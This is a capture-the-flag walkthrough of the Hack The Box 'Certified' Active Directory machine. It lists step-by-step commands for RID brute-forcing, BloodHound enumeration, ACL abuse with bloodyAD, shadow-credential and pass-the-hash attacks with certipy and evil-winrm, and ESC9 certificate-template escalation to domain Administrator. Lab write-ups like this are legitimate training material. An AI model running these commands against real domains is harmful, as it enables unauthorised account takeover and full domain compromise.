**NOTES:**

VPN 10.10.11.41

**Machine Information**

As is common in Windows pentests, you will start the Certified box with
credentials for the following account: **Username: judith.mader
Password: judith09**

1.  Add **certified.htb** to **/etc/hosts** file **RUN:** **sudo nano
    /etc/hosts**

2.  Nmap error

> **RUN:** **nmap -sV -Pn 10.10.11.41 \<- this did not start**
>
> ![](images/media/image1.png){width="2.817707786526684in"
> height="0.4465223097112861in"}

3.  **Rerun** with verbose set. **RUN:** **nmap -sV -Pn -v 10.10.11.41**

> ![](images/media/image2.png)
>
> OR
>
> **Nmap scan:**
>
> **RUN: sudo nmap -Pn -p- \--min-rate 2000 -sC -sV -oN nmap-scan.txt
> TARGET_IP_OR_HOSTNAME_HERE**
>
> **[Alternative:]{.mark}**
>
> **RUN: Nmap -sV -Pn -T4 10.10.11.32 (This scan is more aggressive
> (faster))**
>
> **[INFO:]{.mark} By pushing SPACE key during scan, you can see what's
> going on during the scans**
>
> ![](images/media/image3.png)

4.  **Get all User names**

> **INFO:** CrackMapExec (post-exploitation tool) gathers info about
> HOSTS, SERVICES, SHARES within a network
>
> **\--rid-brute:** RID (Relative Identifier) last part of SID.
> Rid-brute enumerates USER-/GROUP-accounts within ACTIVE DIRECTORY.
>
> **RUN:** **crackmapexec smb certified.htb -u \"judith.mader\" -p
> \"judith09\" \--rid-brute \| grep SidTypeUser**
>
> ![](images/media/image4.png)

5.  **Bloodhound**

> **INFO:** **Bloodhound-python** **-c All** collects
> Users,Groups,Computers,Domains,GPOs,ACLs and more, from Active
> Directory Domain (Downloads **JSON-files**) and sends it to Bloodhound
> Database
>
> **RUN: bloodhound-python -u judith.mader -p \'judith09\' -c All -d
> certified.htb -ns 10.10.11.41**
>
> ![](images/media/image5.png)
>
> **[Error: Failed to get Kerberos TGT]{.mark}**
>
> [Fix Kerberos clock skew issue.]{.mark}
>
> **RUN:** **sudo** **ntpdate dc01.certified.htb**
>
> **RUN:** **sudo timedatectl set-ntp true**
>
> **1^st^ Rerun:** **bloodhound-python -u judith.mader -p \'judith09\'
> -c All -d certified.htb -ns 10.10.11.41**
>
> ![](images/media/image6.png)
>
> ![](images/media/image7.png){width="5.0in"
> height="1.462810586176728in"}
>
> **[(this fixed the ERROR)]{.mark} RUN:** **sudo ntpdate 10.10.11.41**
>
> ![](images/media/image8.png)
>
> **[WORKING]{.mark}** (NO ERRORS) at **2^nd^ Rerun**:
> **bloodhound-python -u judith.mader -p \'judith09\' -c All -d
> certified.htb -ns 10.10.11.41**
>
> ![](images/media/image9.png)

6.  Import all JSON-files into BloodhoundGUI for analysis

> **INFO:** The JSON-files will be located in the same directory, as the
> Terminal was started in.
>
> ![](images/media/image10.png)
>
> Bloodhound missing? -\> installation GUIDE
> <https://www.kali.org/tools/bloodhound/>
>
> **6.1 RUN:** **sudo neo4j console INFO:**without this, you
> cannot connect to Database!
>
> **6.2** Open address in Browser and change default Password:
> **localhost:7474/browser**
>
> **6.3** Start Bloodhound: Login with credentials (previously
> configured) **User:** neo4j **Password:** as163452
>
> Drag & Drop JSON files. Go to Analysis TAB or search directly
>
> ![](images/media/image11.png)
>
> **Direct search**. Type user:USERNAME or group:GROUPNAME
>
> ![](images/media/image12.png)
>
> **IMPORTANT:** Generic All, Generic Write relations should be
> displayed

7.  **OUTBOUND OBJECT CONTROL**

> Judith can change OWNER of a group, or modify **ACL Access Control
> List**
>
> ![](images/media/image13.png)

8.  Check
    [**management@certified.htb**](mailto:management@certified.htb)

> **INFO: Generic Write**: The management group **can write to the
> SVCs**.
>
> ![](images/media/image14.png)
>
> **Management** has FULL CONTROL (Generic All) over **Management_SVC**
>
> ![](images/media/image15.png)

9.  Check
    [**management_SVC@certified.htb**](mailto:management_SVC@certified.htb)

> ![](images/media/image16.png)
>
> **Management_SVC** has FULL CONTROL (Generic All) over **CA_Operator**
>
> ![](images/media/image17.png)

10. Lone's overview INFO: Look for Domain Controller

> ![](images/media/image18.png)

**[User - Foothold]{.underline}**

1.  Change the **OWNER** of **Management group**

> **INFO:** Rename file to run_bloodyAD.py or something else, otherwise
> it won't work
>
> **RUN: python3 run_bloodyAD.py \--host 10.10.11.41 -d certified.htb -u
> judith.mader -p judith09 set owner
> \"CN=Management,CN=Users,DC=certified,DC=htb\" \"CN=Judith
> Mader,CN=Users,DC=certified,DC=htb\"**
>
> ![](images/media/image19.png)
>
> ![](images/media/image20.png)

2.  Add **Generic All for Judith.Mader on MANAGEMENT**

> **RUN:** **python3 run_bloodyAD.py \--host 10.10.11.41 -d
> certified.htb -u judith.mader -p judith09 add genericAll
> \"CN=Management,CN=Users,DC=certified,DC=htb\" \"CN=Judith
> Mader,CN=Users,DC=certified,DC=htb\"**
>
> ![](images/media/image21.png)
>
> ![](images/media/image22.png)

3.  Add **Group Member**

> **INFO:** If this succeeds, skip next STEP 4
>
> **RUN:** **python3 run_bloodyAD.py \--host 10.10.11.41 -d
> certified.htb -u judith.mader -p judith09 add groupMember
> \"CN=Management,CN=Users,DC=certified,DC=htb\" \"CN=Judith
> Mader,CN=Users,DC=certified,DC=htb\"**
>
> ![](images/media/image23.png)

4.  Add **Judith.Mader to the Management group**

> **[INFO: Same Result as in STEP 3, but uses Remote Procedure Call
> (RPC)]{.mark}**
>
> **RUN:** **net rpc group addmem \"Management\" \"judith.mader\" -U
> \"certified.htb\"/\"judith.mader\"%\"judith09\" -S
> \"DC01.certified.htb\"**
>
> ![](images/media/image24.png)

5.  **Check** if User Judith.mader is **member of Management group**

> **INFO:** Password is from User Judith.mader
>
> **RUN:** **net rpc group members \"MANAGEMENT\" -U
> \"certified.htb\"/\"judith.mader\" -S \"certified.htb\"**
>
> ![](images/media/image25.png)

6.  This command uses **certipy-ad** to perform a **\"shadow credential
    attack\" against the management_svc account** in the certified.htb
    domain, using the credentials of judith.mader

> **Result:** If successful, this **will allow authentication to the
> management_svc account** using a certificate, **without needing the
> accounts password**
>
> **RUN:** **certipy-ad shadow add -u \"judith.mader@certified.htb\" -p
> \'judith09\' -account \"management_svc\" -ns 10.10.11.41**
>
> ![](images/media/image26.png)

7.  TGT: Then **request the TGT ticket, using certificate for
    MANAGEMENT_SVC account**. If an error occurs, use ntpdate to
    synchronize the time zone.

> **INFO:** To get **gettgtpkinit.py** -\> search for-\> **PKINITtools**
>
> **-management_svc.pfx :**This file contains the certificate and
> private key for Management_svc account
>
> **RUN:** **python3 gettgtpkinit.py -cert-pfx management_svc.pfx
> CERTIFIED.HTB/management_svc management_svc.ccache -dc-ip 10.10.11.41
> -v**
>
> **INFO:** If not working, use NTP to synchronize your machine\'s clock
>
> **RUN:** **sudo apt-get install ntp**
>
> **RUN:** **sudo ntpdate 10.10.11.41** (ip is from DC (Machine's VPN
> IP))
>
> **RUN:** **sudo systemctl restart ntp**
>
> **Minikerberos : AS-REP encryption key**
>
> ![](images/media/image27.png)

8.  Get **NT-HASH (NTLM)**

> **(This is what hash looks like-\> a091c1832bcdd4677c28b5a6a1295584)**
>
> **RUN:** **export KRB5CCNAME=./management_svc.ccache**
>
> **INFO:** This command sets an environment variable named KRB5CCNAME
> to the value ./management_svc.ccache
>
> **RUN:** **python3 getnthash.py CERTIFIED.HTB/management_svc -key
> 5b680911933e7f8641c0bd5b97f8c84185f7cfa75bfdba61d46b0a8f4b00ba62**
>
> **INFO:** Download getnthash.py file. **[Paste key from STEP
> 7]{.mark}**. If python3 command shouldn\'t work, resync clock, see
> step 7.
>
> **ERROR:** **Kerberos SessionERROR: KRB_AP_ERR_SKEW(Clock skew too
> great)**
>
> **Solution:** Resync clock, see screenshot below.
>
> ![](images/media/image28.png)

9.  With NThash, you can use **REMOTE TOOL to LOGIN REMOTELY** (USER:
    management_svc)

> **RUN:** **evil-winrm -i certified.htb -u management_svc -H
> \"a091c1832bcdd4677c28b5a6a1295584\"**

**Root -- Privilege Escalation**

1.  **PASS THE HASH. NTLM-HASH**. Change password of **CA_Operator
    account**

> **[INFO: 123456789 will be the NEW PASSWORD]{.mark}**
>
> [**INFO: Paste the NTLM HASH** from **FOOTHOLD STEP 8**]{.mark}
>
> **RUN:** **pth-net rpc password \"ca_operator\" \"123456789\" -U
> \"certified.htb\"/\"management_svc\"%\"a091c1832bcdd4677c28b5a6a1295584\":\"a091c1832bcdd4677c28b5a6a1295584\"
> -S \"DC01.certified.htb\"**

2.  Check if MOD is successful

**RUN:** **nxc smb 10.10.11.41 -u ca_operator -p 123456789**

**INFO:**

-nxc=NetExec attempts SMB (ServerMessageBlock) authentication

-type in behind -p, the NEW PASSWORD

3.  Find **vunerable certificate templates** within Active Directory

> **RUN:** **certipy-ad find -u ca_operator -p \'123456789\' -dc-ip
> 10.10.11.41 -text -stdout -vulnerable**
>
> All steps explained in this article:
>
> https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-andrequest-
>
> methods-and-more-7237d88061f7

4.  Get **HASH of CA_OPERATOR** : 89551acff8895768e489bb3054af94fd and
    ca_operator.ccache

> [**INFO: Paste the NTLM HASH** from **BOTTOM OF SCREENSHOT in FOOTHOLD
> STEP 8**]{.mark}
>
> **RUN: certipy-ad shadow auto -u management_svc@certified.htb -hashes
> a091c1832bcdd4677c28b5a6a1295584 -account ca_operator -ns
> 10.10.11.41**
> ![](images/media/image29.png){width="6.291666666666667in"
> height="1.7243055555555555in"}
>
> INFO: If not working, use NTP to synchronize your machine\'s clock
>
> **RUN:** sudo apt-get install ntp (ONLY needed if app not installed)
>
> **RUN:** **sudo ntpdate 10.10.11.41** (ip is from DC (Machines VPN
> IP))
>
> **RUN:** **sudo systemctl restart ntp**

5.  **RUN:** **export KRB5CCNAME=ca_operator.ccache**

6.  Change the **userPrincipalName** of **ca_operator to be
    Administrator**

[**INFO: Paste the NTLM HASH** from **BOTTOM OF SCREENSHOT in FOOTHOLD
STEP 8**]{.mark}

> **RUN:** **certipy-ad account update -username
> management_svc@certified.htb -hashes
> \':a091c1832bcdd4677c28b5a6a1295584\' -user ca_operator -upn
> administrator@certified.htb -ns 10.10.11.41**
>
> **Result: See screenshot in STEP 7, down below.**

7.  Now, we request the vulnerable certificate template ESC9 . We must
    **request the certificate as ca_operator**

> **[INFO: Take the hash from result in TERMINAL of STEP 4]{.mark}**
>
> **[INFO: certified-DC01-CA\' = common name of Certificate Authority
> (CA)]{.mark}**
>
> **RUN:** **certipy-ad req -ca \'certified-DC01-CA\' -username
> ca_operator@certified.htb -hashes c22b315c040ae6e0efee3518d830362b
> -template CertifiedAuthentication -ns 10.10.11.41**
>
> Saves PFX file.
>
> **ERROR: The NETBIOS connection with the remote host timed out**
>
> Solution: **Repeat command from STEP 7**
>
> ![](images/media/image30.png)

8.  Then, we **change** **back** the **userPrincipalName** of
    **ca_operator to be something else**, like her original
    **userPrincipalName** ca_operator@certified.htb .

> **RUN:** **certipy-ad account update -username
> management_svc@certified.htb -hashes
> \':a091c1832bcdd4677c28b5a6a1295584\' -user ca_operator -upn
> ca_operator@certified.htb -ns 10.10.11.41**
>
> ![](images/media/image31.png)

9.  **[SKIP THIS]{.mark}** Once the UPN is changed, **request a
    certificate to that UPN** .

> **RUN:** **certipy-ad req -username ca_operator@certified.htb
> -hashes**
>
> **b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template**
>
> **CertifiedAuthentication -debug**
>
> **INFO:** The -ca and -template should be set to correct values which
> can be found from the certipy
>
> find command as mentioned above.
>
> This will create a certificate ( administrator.pfx ), which can be
> used to authenticate to the
>
> Domain Controller as the Administrator user.

10. **[SKIP THIS]{.mark}** Before that, the ca_operator user\'s UPN must
    be changed to the original one.

> **RUN: certipy-ad account update -username
> management_svc@certified.htb -hashes**
>
> **a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn
> ca_operator@certified.htb**

11. Now, if we **try to authenticate with the certificate**, we will
    **receive the NT hash of the Administrator**

> **RUN:** **certipy-ad auth -pfx administrator.pfx -domain
> certified.htb -ns 10.10.11.41**

12. **NO SECURITY EXTENSION -- ESC9**

> **Source:**
> https://github.com/b4rdia/HackTricks/blob/master/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
>
> Use TOOL Certipy to **obtain CERTIFICATE INFORMATION of
> judith.mader@certified.htb and obtain CERTIFIED-DC01-CA, configuration
> of the CERTIFICATE AUTHORITY (CA)**
>
> **RUN:** **certipy-ad find -u judith.mader@certified.htb -p judith09
> -dc-ip 10.10.11.41**
>
> ![](images/media/image32.png)

13. NoSecurityExtension exists, see screenshot, so **ESC9 can be used to
    attack**.

> With TOOL Certipy: **Update NT hash to account CA_OPERATOR. Change
> account\'s UserPrincipalName (UPN) to Administrator**.
>
> **RUN:** **certipy-ad account update -username
> management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584
> -user ca_operator -upn Administrator**
>
> **If successful, there is now a Aministrator certificate that can
> represent the account.**

14. **Requests a certificate from a Certificate Authority (CA)** within
    an Active Directory environment

> **RUN:** **certipy-ad req -username ca_operator@certified.htb -p
> 123456789 -ca certified-DC01-CA -template CertifiedAuthentication
> -debug**

15. Use Certipy to **perform Kerberos authentication as a user through
    the certificate file ADMINISTRATOR.PFX**,
    Administrator@certified.htb and successfully obtain the TGT and NT
    hash

> **RUN:** **certipy-ad auth -pfx administrator.pfx -domain
> certified.htb**

16. Use REMOTE TOOL to **LOGIN REMOTELY** (USER: administrator)

> **RUN:** **evil-winrm -i certified.htb -u administrator -H
> \"0d5b49608bbce1751f708748f67e2d34\"**
